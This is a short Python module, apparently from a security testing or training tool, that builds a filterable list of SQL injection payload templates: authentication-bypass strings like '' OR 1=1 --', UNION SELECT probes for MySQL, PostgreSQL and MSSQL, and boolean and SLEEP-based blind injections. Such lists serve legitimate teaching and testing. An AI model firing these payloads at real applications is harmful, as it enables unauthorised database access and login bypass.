# modules/sqli.py

def generate_sqli(db_type=None, injection_type=None):
    """
    Generate educational SQL Injection payload templates.
    Supports:
    - Types: error, union, blind
    - DB types: mysql, postgresql, mssql
    - Comment-based bypass examples
    - Case variation logic
    """

    payloads = []

    # ERROR-BASED SQLi

    payloads.append({
        "id": "SQLI-ERR-001",
        "type": "error",
        "db": "generic",
        "payload": "' OR 1=1 --",
        "description": "Basic error-based SQL injection",
        "bypass_techniques": ["comment injection", "case variation"]
    })

    payloads.append({
        "id": "SQLI-ERR-002",
        "type": "error",
        "db": "generic",
        "payload": "' OR 'a'='a' --",
        "description": "Classic authentication bypass",
        "bypass_techniques": ["boolean logic abuse"]
    })

    # UNION-BASED SQLi

    payloads.append({
        "id": "SQLI-UNION-MYSQL-001",
        "type": "union",
        "db": "mysql",
        "payload": "' UNION SELECT null, null --",
        "description": "Union-based SQLi for MySQL",
        "bypass_techniques": ["comment injection", "case manipulation"]
    })

    payloads.append({
        "id": "SQLI-UNION-PG-001",
        "type": "union",
        "db": "postgresql",
        "payload": "' UNION SELECT NULL, NULL --",
        "description": "Union-based SQLi for PostgreSQL",
        "bypass_techniques": ["uppercase variation"]
    })

    payloads.append({
        "id": "SQLI-UNION-MSSQL-001",
        "type": "union",
        "db": "mssql",
        "payload": "' UNION SELECT NULL, NULL;--",
        "description": "Union-based SQLi for MSSQL",
        "bypass_techniques": ["semicolon chaining", "comment injection"]
    })

    # BLIND SQLi (Boolean-Based)

    payloads.append({
        "id": "SQLI-BLIND-BOOL-001",
        "type": "blind",
        "db": "generic",
        "payload": "' AND 1=1 --",
        "description": "Boolean-based blind SQLi (true condition)",
        "bypass_techniques": ["boolean logic abuse"]
    })

    payloads.append({
        "id": "SQLI-BLIND-BOOL-002",
        "type": "blind",
        "db": "generic",
        "payload": "' AND 1=2 --",
        "description": "Boolean-based blind SQLi (false condition)",
        "bypass_techniques": ["boolean logic abuse"]
    })

    payloads.append({
        "id": "SQLI-BLIND-TIME-001",
        "type": "blind",
        "db": "mysql",
        "payload": "' AND SLEEP(5) --",
        "description": "Time-based blind SQLi example (MySQL syntax)",
        "bypass_techniques": ["time delay functions", "comment injection"],
        "note": "Educational template only — no live execution"
    })

    # Filtering Logic

    if injection_type:
        payloads = [p for p in payloads if p["type"] == injection_type]

    if db_type:
        payloads = [p for p in payloads if p["db"] == db_type or p["db"] == "generic"]

    return payloads
